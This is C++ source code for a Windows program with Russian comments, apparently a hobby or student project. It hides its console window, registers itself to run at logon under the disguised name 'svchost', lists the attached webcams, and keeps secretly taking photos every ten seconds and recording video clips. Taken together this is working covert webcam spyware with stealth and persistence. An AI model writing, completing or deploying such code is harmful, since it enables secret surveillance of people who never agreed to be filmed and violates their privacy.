#include <opencv2/core.hpp>
#include <opencv2/videoio.hpp>
#include <opencv2/highgui.hpp>
#include <dshow.h>
#include <iostream>
#include <format>
#include <winsock.h>
#include <SetupAPI.h>
#include <devguid.h>
#include <locale>
#include <Windows.h>
#include <chrono>
#include <thread>

#pragma comment(lib, "strmiids.lib")
#pragma comment(lib, "ws2_32.lib") 
#pragma comment(lib, "SetupAPI.lib")


using namespace cv;
using namespace std;


cv::VideoCapture Capturer;

std::wstring GetDeviceProperty(HDEVINFO deviceInfoSet, SP_DEVINFO_DATA deviceInfoData, DWORD property)
{
    DWORD dataType;
    WCHAR dataBuffer[1024];
    DWORD bufferSize = sizeof(dataBuffer);

    if (SetupDiGetDeviceRegistryProperty(deviceInfoSet, &deviceInfoData, property, &dataType, reinterpret_cast<PBYTE>(dataBuffer), bufferSize, NULL))
    {
        if (dataType == REG_SZ)
        {
            return std::wstring(dataBuffer);
        }
    }

    return L"";
}

string GetWebcamInfo()
{
    HDEVINFO deviceInfoSet = SetupDiGetClassDevs(&GUID_DEVCLASS_CAMERA, NULL, NULL, DIGCF_PRESENT);//DIGCF_PRESENT - Возвращайте только те устройства, которые в данный момент присутствуют в системе.


    if (deviceInfoSet == INVALID_HANDLE_VALUE)
    {
        throw exception("Failed to get device information.");
    }

    SP_DEVINFO_DATA deviceInfoData; //определяет экземпляр устройства, который является членом набора информации об устройстве.
    deviceInfoData.cbSize = sizeof(SP_DEVINFO_DATA);//нужно для setupDiXXX

    DWORD deviceIndex = 0;
    string info("DeviceId: ");
    while (SetupDiEnumDeviceInfo(deviceInfoSet, deviceIndex, &deviceInfoData))
    {
        //wstring info();
        wstring deviceId = GetDeviceProperty(deviceInfoSet, deviceInfoData, SPDRP_HARDWAREID);
        wstring deviceName = GetDeviceProperty(deviceInfoSet, deviceInfoData, SPDRP_FRIENDLYNAME);
        wstring manufacturer = GetDeviceProperty(deviceInfoSet, deviceInfoData, SPDRP_MFG);
        wstring model = GetDeviceProperty(deviceInfoSet, deviceInfoData, SPDRP_DEVICEDESC);
        wstring driver = GetDeviceProperty(deviceInfoSet, deviceInfoData, SPDRP_DRIVER);
        wstring location = GetDeviceProperty(deviceInfoSet, deviceInfoData, SPDRP_LOCATION_INFORMATION);

       
        transform(deviceId.begin(), deviceId.end(), std::back_inserter(info), [](wchar_t c) {
            return (char)c;
            });
        
        info.append("\nWebcam ");
        info.append(to_string(deviceIndex));
        
        info.append("\nName: ");
        transform(deviceName.begin(), deviceName.end(), std::back_inserter(info), [](wchar_t c) {
            return (char)c;
            });

        info.append("\nManufacturer: ");
        transform(manufacturer.begin(), manufacturer.end(), std::back_inserter(info), [](wchar_t c) {
            return (char)c;
            });
            
        info.append("\nModel: ");
        transform(model.begin(), model.end(), std::back_inserter(info), [](wchar_t c) {
            return (char)c;
            });

        info.append("\nDriver: ");
        transform(driver.begin(), driver.end(), std::back_inserter(info), [](wchar_t c) {
            return (char)c;
            });

        info.append("\nLocation: ");
        transform(location.begin(), location.end(), std::back_inserter(info), [](wchar_t c) {
            return (char)c;
            });
        
        deviceIndex++;
    }

    SetupDiDestroyDeviceInfoList(deviceInfoSet);

    return info;
}

string CreateName(string name, string extension, int num) {
    string result(name);
    result.append(to_string(num));
    result.append(extension);
    return result;
}

void TakePhoto() {
    int counter = 0;
    Mat frame;
    while (true) {
        Capturer.read(frame);
        imwrite(CreateName("photo", ".jpg", counter), frame);
        chrono::duration<int, std::milli> timerDuration(10000);
        this_thread::sleep_for(timerDuration);
        counter++;
    }

}

void CaptureVideo() {
    int frameWidth = Capturer.get(CAP_PROP_FRAME_WIDTH);
    int frameHeight = Capturer.get(CAP_PROP_FRAME_HEIGHT);
    int fps = 30;
    int counter = 0;
    Mat frame;
    while (true) {
        VideoWriter videoWriter(CreateName("video", ".avi", counter), VideoWriter::fourcc('M', 'J', 'P', 'G'), fps, Size(frameWidth, frameHeight));
        //MJPG - Motion Jpg
        if (!videoWriter.isOpened()) {
            throw exception("can't open videoWriter");
        }

        int recordDuration = 0;
        while (recordDuration++ < 300) {
            Capturer.read(frame);
            videoWriter.write(frame);
            //imshow("Video", frame);
        }

        videoWriter.release();
        counter++;
        chrono::duration<int, std::milli> timerDuration(10000);
        this_thread::sleep_for(timerDuration);
    }

}

void ExitHandler() {
    Capturer.release();
}

void HideConsole() {
    HWND window;
    AllocConsole();
    window = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(window, 0); // 0 - SW_HIDE;

}

void SetAutoRun() {
    //путь к exe
    wchar_t exePath[MAX_PATH];
    GetModuleFileName(NULL, exePath, MAX_PATH); //NULL путь к исполняемому процессу;
    // ключ реестра
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_CURRENT_USER, L"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) //error
    {
        // вписать в реестр
        if (RegSetValueEx(hKey, L"svchost", 0, REG_SZ, (BYTE*)exePath, (wcslen(exePath) + 1) * sizeof(wchar_t)) == ERROR_SUCCESS) { // REG_SZ - A null-terminated string+++++++++++++++++++++++++++++++++++++++
            std::cout << "Program added to startup." << std::endl;
        }
        else {
            throw exception("Can't setupAutoLoad");
        }

        RegCloseKey(hKey);
    }
    else {
        throw exception("Can't open Key");
    }

}

int main()
{
    HideConsole();
    try {
        SetAutoRun();
    }
    catch (const exception& ex) {
        cerr << ex.what() << endl;
    }
    atexit(ExitHandler);
    WSADATA wsaDATA;
    WORD DllVersion = MAKEWORD(2, 1);
    if (WSAStartup(DllVersion, &wsaDATA) != 0) {
        cout << "error" << endl;
    }

    setlocale(LC_ALL, "Russian");
    string info = GetWebcamInfo();
    cout << info << endl;
  
    int deviceID = 0;
    Capturer.open(deviceID, cv::CAP_ANY);

    if (!Capturer.isOpened()) {
        throw exception("Can't open capturer");
    }
    cout << "Start grabbing" << endl << "Press any key to terminate" << endl;
    thread PhotoThread(TakePhoto);
    CaptureVideo();

    return 0;
}

